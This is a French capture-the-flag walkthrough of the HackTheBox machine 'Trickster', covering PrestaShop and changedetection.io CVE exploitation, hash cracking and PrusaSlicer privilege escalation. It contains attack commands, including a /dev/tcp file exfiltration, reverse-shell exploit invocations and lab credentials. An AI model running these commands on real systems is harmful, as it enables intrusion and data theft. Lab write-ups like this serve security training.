---
date: 2025-01-31T00:00:34-06:00
# description: ""
image: "/images/HTB-Trickster/Trickster.png"
lastmod: 2025-01-31
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: Trickster"
showTableOfContents: true
type: "post"
---

* Platforme: HackTheBox
* Lien: [Trickster](https://app.hackthebox.com/machines/Trickster)
* Niveau: Moyen
* OS: Linux
---

[Lire cet article en anglais](https://scorpiosec.com/posts/htb-trickster/)

Trickster débute par la découverte d'un sous-domaine contenant un répertoire `.git`, utilisant une version exploitable de `PrestaShop`. Avec le `CVE-2024-34716`, nous obtenons un accès initial au système et récupérons les identifiants de la base de données à partir d'un fichier de configuration. 

L'énumération du système révèle une interface Docker interne avec un hôte exécutant une instance vulnérable de `changedetection.io`, qui, lorsqu'elle est exploitée (avec le `CVE-2024-32651`), fournit un accès root à l'intérieur du conteneur. Nous y obtenons des fichiers de sauvegarde contenant des identifiants que nous utilisons pour passer à un autre utilisateur. La dernière escalade de privilèges vers l'utilisateur root est réalisée en exploitant `PrusaSlicer`.

Adresse IP cible - `10.10.11.34`

## Balayage

```
nmap -sC -sV -Pn -oA nmap/Trickster 10.10.11.34
```

**Résultats**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-30 14:22 CST
Nmap scan report for 10.10.11.34
Host is up (0.059s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 8c:01:0e:7b:b4:da:b7:2f:bb:2f:d3:a3:8c:a6:6d:87 (ECDSA)
|_  256 90:c6:f3:d8:3f:96:99:94:69:fe:d3:72:cb:fe:6c:c5 (ED25519)

80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://trickster.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: _; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.91 seconds
```

Nmap trouve deux ports ouverts:
* 22 - SSH
* 80 - http, et une redirection vers `trickster.htb`

```
sudo echo "10.10.11.34 trickster.htb" | sudo tee -a /etc/hosts
```

## Enumération

A `http://trickster.htb/` nous trouvons un site web sans aucun élément exploitable.

![Trickster website](/images/HTB-Trickster/trickster_website.png)

Nous procédons à une énumération des sous-domaines.
```
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --fc 404 -t 100 -u http://trickster.htb -H "Host: FUZZ.trickster.htb" -ic
```

![subdomain enumeration](/images/HTB-Trickster/trickster_ffuf.png)

La plupart des résultats ont un statut `301` (ce sont tous des faux-positifs), nous pouvons les filtrer en mettant à jour la commande.

```
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --fc 404,301 -t 100 -u http://trickster.htb -H "Host: FUZZ.trickster.htb" -ic
```

![subdomain enumeration filtered](/images/HTB-Trickster/trickster_ffuf2.png)

Nous trouvons le sous-domaine `shop`.

À `http://shop.trickster.htb/`, il y a un site web de ecommerce.

![store subdomain](/images/HTB-Trickster/trickster_store.png)

Il utilise [PrestaShop](https://www.prestashop-project.org/), un logiciel open source pour créer des platformes de ecommerce.

![Wappalyzer](/images/HTB-Trickster/trickster_prestashop.png)

> J'ai trouvé quelques CVEs pour Prestashop tels que [CVE-2021-3110](https://pentest-tools.com/vulnerabilities-exploits/prestashop-1770-sql-injection_2545) and [CVE-2022-31101](https://www.exploit-db.com/exploits/51001) mais aucun d'entre eux ne fonctionnent sur la cible.

Avec l'énumération des répertoires, nous trouvons un répertoire `.git` sur le sous-domaine.

```
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -u http://shop.trickster.htb/FUZZ -ic -fs 283
```

![.git directory](/images/HTB-Trickster/ffuf_trickster_git.png)

Nous pouvons y accéder via le navigateur à l'adresse `http://shop.trickster.htb/.git/`.

![.git directory content](/images/HTB-Trickster/git_content.png)

Nous utilisons [git-dumper](https://github.com/arthaud/git-dumper) pour télécharger le dépôt sur notre machine locale.

```
git-dumper http://shop.trickster.htb/.git/ git_trickster
```

![.git directory download](/images/HTB-Trickster/git_dumper.png)

Nous obtenons deux répertoires: `.git` (celui que nous connaissons déjà) et `admin634ewutrx1jgitlooaj`. Nous vérifions également les commits avec `git log` et n'en trouvons qu'un seul, concernant la mise à jour d'un panneau d'administration par `adam@tricksterhtb`.

![git log command](/images/HTB-Trickster/adam_commit.png)

Sur `http://shop.trckster.htb/admin634ewutrx1jgitlooaj/` il y a une page de login avec `PrestSahop 8.1.5`.

![prestashop 8.1.5](/images/HTB-Trickster/prestashop_8.1.5.png)

## Accès initial

Après des recherches sur l'exploitation de cette version, nous trouvons [cet](https://ayoubmokhtar.com/post/png_driven_chain_xss_to_remote_code_execution_prestashop_8.1.5_cve-2024-34716/) article  à propos du `CVE-2024-34716` et un PoC est disponible sur [ce](https://github.com/aelmokhtar/CVE-2024-34716) dépôt Github.

L'exploit nécessite un serveur web sur le port 5000.

```
python3 -m http.server 5000
```

![web server trickster exploit](/images/HTB-Trickster/web_server_trickster.png)

Nous pouvons ensuite l'exécuter.

```
python3 exploit.py --url http://shop.trickster.htb --email adam@trickster.htb --local-ip YOUR_IP --admin-path admin634ewutrx1jgitlooaj
```

Nous obtenons un shell sous le nom de `www-data`.

![foothold](/images/HTB-Trickster/foothold.png)

Sur [ce site](https://classydevs.com/prestashop-database-config-file/) nous apprenons le fichier de configuration de la base de données Prestashop se trouve soit dans `votre-siteweb/config/settings.inc.php` (pour v1.5-1.6) soit dans `votre-siteweb/app/config/parameters.php` (pour v1.7).

Dans `/var/www/prestashop/config/config.inc.php` nous trouvons une ligne pointant vers `parameters.php`.

![configuration file](/images/HTB-Trickster/config_file.png)

### Shell en tant que james

Dans `/var/www/prestashop/app/config/parameters.php` nous découvrons les informations d'identification de la base de données.

```
ps_user:prest@shop_o
```

![foothold](/images/HTB-Trickster/database_creds.png)

Nous nous connectons à la base de données MySQL.

```
mysql -u ps_user -p
```

En utilisant la commande `DESCRIBE` nous inspectons les tables, `ps_employee` semble prometteur.

```SQL
DESCRIBE table_name;
```

![ps_employee columns](/images/HTB-Trickster/ps_employee_fields.png)

Nous trouvons les hachages de mots de passe.

```SQL
select lastname, firstname, email, passwd from ps_employee
```

![password hashes](/images/HTB-Trickster/mysql_creds.png)

Nous craquons le hachage de `james` avec hashcat et récupérons le mot de passe `alwaysandforever`.

```
hashcat -m 3200 -a 0 james_hash.txt /usr/share/wordlists/rockyou.txt
```

![james password cracked](/images/HTB-Trickster/james_pwd.png)

Ce dernier nous permet de nous connecter en tant que `james` via SSH et de récupérer le drapeau utilisateur.

![user flag found](/images/HTB-Trickster/user_flag.png)

Linpeas montre que Docker est en cours d'exécution.

![Docker found running](/images/HTB-Trickster/docker_present.png)

Avec `ip a` nous trouvons une interface interne de Docker (`docker0`) avec l'adresse IP `172.17.0.1` et le sous-réseau `172.17.0.0/16`.

![Internal docker subnet](/images/HTB-Trickster/docker_network.png)

Nous scannons ce réseau pour trouver ses hôtes. Le binaire nmap est disponible [ici](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap).

```
./nmap -sn 172.17.0.0/16
```

![Internal nmap scan](/images/HTB-Trickster/internal_nmap_scan.png)

Nous trouvons deux hôtes : `172.17.0.1` (notre addresse) et `172.17.0.2` que nous scannons.

```
./nmap -p- 172.17.0.2
```

Le port `5000` est ouvert.

![Open ports on 172.17.0.2](/images/HTB-Trickster/port_5000_open.png)

Avec un tunnel ssh, nous accédons au port.

```
ssh -L PORT_NUMBER:172.17.0.2:5000 james@trickster.htb
```

![SSH tunneling command](/images/HTB-Trickster/SSH_tunneling.png)

À l'adresse `http://localhost:5000/` nous trouvons une instance de [changedetection.io](https://changedetection.io/), un outil pour surveiller les changements dans les pages web. Nous nous connectons avec le mot de passe `james`, l'application utilise la version `v0.45.20`.

![changedetection version](/images/HTB-Trickster/changedetection_version.png)

### Shell en tant que root (Docker)

Après quelques recherches, nous découvrons le [CVE-2024-32651](https://www.hacktivesecurity.com/blog/2024/05/08/cve-2024-32651-server-side-template-injection-changedetection-io/) avec un PoC [ici](https://github.com/evgeni-semenov/CVE-2024-32651). Nous utilisons l'exploit et nous nous retrouvons dans un conteneur Docker avec le contrôle du compte root.

```
python3 cve-2024-32651.py --url http://localhost:5000/ --ip YOUR_IP --port 9001 --password alwaysandforever
```

![cve-2024-32651](/images/HTB-Trickster/CVE_2024_32651.png)

Dans `/datastore/Backups` nous trouvons des fichiers zip.

![backups archives](/images/HTB-Trickster/backup_archives.png)

Le conteneur ne dispose ni de `curl`, `wget`, ou `nc`. Nous envoyons donc les données à `/dev/tcp` pour le transfert de fichiers.

Sur la cible, nous lançons:

```
cat changedetection-backup-20240830194841.zip > /dev/tcp/YOUR_IP/PORT_NUMBER
```

Sur notre machine locale, nous exécutons:

```
nc -l -p {PORT_NUMBER} -q 1 > changedetection-backup-20240830194841.zip
```

Après l'extraction, nous avons un répertoire et quelques fichiers.

![extracted files](/images/HTB-Trickster/backup_extracted_files.png)

Le répertoire contient deux fichiers, l'un avec l'extension `.br`. 

> Un fichier portant l'extension .br est un fichier compressé en Brotli. Brotli est un algorithme de compression sans perte développé par Google, principalement utilisé pour compresser des ressources web telles que CSS, JavaScript et HTML afin d'améliorer la vitesse de chargement des sites web. _Pour en savoir plus, cliquez [ici](https://docs.fileformat.com/web/br/)._

![files found in archive](/images/HTB-Trickster/files_found.png)

### Shell en tant que adam

Nous décompressons le fichier avec `brotli` et obtenons un fichier appelé `f04f0732f120c0cc84a993ad99decb2c.txt`.

```
brotli -d f04f0732f120c0cc84a993ad99decb2c.txt.br
```

![brotli decompressed file](/images/HTB-Trickster/brotli_decompress.png)

Le fichier contient les identifiants `adam:adam_admin992`.

![credentials in decompressed file](/images/HTB-Trickster/creds_brotli.png)

Nous les utilisons pour nous connecter en tant que `adam` via SSH. Cet utilisateur peut exécuter `/opt/PrusaSlicer/prusaslicer` en tant que root.

### Shell en tant que root

![Adam SSH login](/images/HTB-Trickster/adam_SSH_login.png)

Une méthode d'escalade des privilèges est disponible [ici](https://github.com/suce0155/prusaslicer_exploit).

```
sudo /opt/PrusaSlicer/prusaslicer -s evil.3mf
```

![prusaslicer privilege escalation](/images/HTB-Trickster/prusaslicer_privesc.png)

Sur le listener, nous obtenons une connexion en tant que `root`.

![root flag](/images/HTB-Trickster/root_flag.png)









